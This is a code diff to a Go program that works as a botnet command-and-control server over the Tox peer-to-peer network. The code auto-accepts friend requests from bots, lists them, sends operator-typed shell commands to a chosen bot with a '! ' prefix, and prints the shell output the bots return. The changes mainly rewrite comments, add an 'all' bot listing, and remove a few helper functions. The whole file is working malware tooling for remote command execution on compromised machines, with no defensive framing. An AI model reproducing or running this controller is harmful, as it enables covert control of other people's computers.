@@ -14,10 +14,7 @@ import (
 	tox "github.com/TokTok/go-toxcore-c"
 )
 
-func init() {
-	log.SetFlags(log.Flags() | log.Lshortfile)
-}
-
+// Tox bootstraps (nodes.tox.chat)
 var server = []interface{}{
 	"85.172.30.117", uint16(33445), "8E7D0B859922EF569298B4D261A8CCB5FEA14FB91ED412A7603A585A25698832",
 }
@@ -42,7 +39,7 @@ var colorWhite = "\033[37m"
 var colorBlack = "\033[30m"
 var colorGrey = "\033[31m"
 
-// ListBots
+// ListBots - Update fv or list bot information
 func Bots(t *tox.Tox, option string) []uint32 {
 
 	fv := t.SelfGetFriendList()
@@ -88,7 +85,7 @@ func Bots(t *tox.Tox, option string) []uint32 {
 	}
 }
 
-// SendMessage - message
+// SendMessage - Send string to friend number
 func SendMessage(t *tox.Tox, friendNumber uint32, message string) error {
 	_, err := t.FriendSendMessage(friendNumber, message)
 	if err != nil {
@@ -223,12 +220,12 @@ func main() {
 			if strings.HasPrefix(input, "bots") {
 				// Split command
 				args := strings.Fields(input)
-				// If there is more or 4 arguments in the command.
+
 				if len(args) >= 3 {
-					// If the 2nd argument in the command is list.
+
 					if args[1] == "list" {
 						if args[2] == "amount" {
-							// Server load, pull all bots
+							// Pull all bots
 							fv = Bots(t, "pull")
 							fmt.Println(string(colorPurple))
 							fmt.Println("\tTotal bots:", len(fv))
@@ -243,10 +240,14 @@ func main() {
 						if args[2] == "offline" {
 							Bots(t, "offline")
 						}
+						// List all
+						if args[2] == "all" {
+							Bots(t, "all")
+						}
 
-						// If the 2nd argument in the command is interact.
+						// Execute shell command
 					} else if args[1] == "interact" {
-						// Grab all bots, when getting ready to interact.
+
 						fv = Bots(t, "pull")
 
 						// Convert ID to int
@@ -260,7 +261,8 @@ func main() {
 							// Send the command to the bot.
 							commands := args[3:]
 							command := strings.Join(commands, " ")
-							err = SendMessage(t, fv[botid], command)
+							// Send shell command
+							err = SendMessage(t, fv[botid], "! "+command)
 
 							if err != nil {
 								fmt.Println("Bot offline...")
@@ -294,7 +296,7 @@ func main() {
 	// Auto accept
 	t.CallbackFriendRequest(func(t *tox.Tox, friendId string, message string, userData interface{}) {
 
-		// When a bot adds the C2. Add them back with no message.
+		// When a bot adds the C2.
 		num, err := t.FriendAddNorequest(friendId)
 
 		if err != nil {
@@ -305,7 +307,7 @@ func main() {
 		}
 	}, nil)
 
-	// On message
+	// Shell output
 	t.CallbackFriendMessage(func(t *tox.Tox, friendNumber uint32, message string, userData interface{}) {
 		fmt.Print(string(colorYellow), "Output:", friendNumber, string(colorCyan), "\n\t\t", message)
 		fmt.Print(string(colorGreen), "-> ", string(colorRed))
@@ -328,12 +330,4 @@ func main() {
 
 	t.Kill()
 
-}
-
-func makekey(no uint32, a0 interface{}, a1 interface{}) string {
-	return fmt.Sprintf("%d_%v_%v", no, a0, a1)
-}
-
-func init() {
-	tox.KeepPkg()
 }
